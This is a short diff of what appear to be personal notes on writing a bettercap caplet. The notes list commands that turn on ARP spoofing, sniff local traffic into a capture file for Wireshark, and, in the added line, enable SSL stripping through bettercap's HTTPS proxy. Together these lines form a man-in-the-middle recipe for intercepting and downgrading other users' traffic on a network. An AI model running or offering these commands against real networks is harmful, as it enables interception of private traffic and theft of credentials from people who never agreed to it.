@@ -90,6 +90,7 @@ use dnf.spoof inside bettercap
         arp.spoof on
         set net.sniff.local true
         set net.sniff.output /anylocation/file.cap       (to open in wireshark)
+        set https.proxy.sslstrip true
         net.sniff on  
      save in extension filename.cap in /root
     to run caplet in bettercap
